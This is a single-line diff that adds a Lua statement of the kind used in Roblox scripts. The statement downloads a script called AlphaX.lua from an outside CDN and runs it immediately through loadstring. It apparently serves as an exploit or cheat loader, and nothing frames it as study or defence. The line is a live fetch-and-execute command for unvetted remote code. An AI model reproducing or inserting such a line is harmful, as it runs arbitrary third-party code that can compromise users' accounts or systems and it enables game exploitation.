@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://cdn.alpha1004.ga/AlphaX.lua", true))()
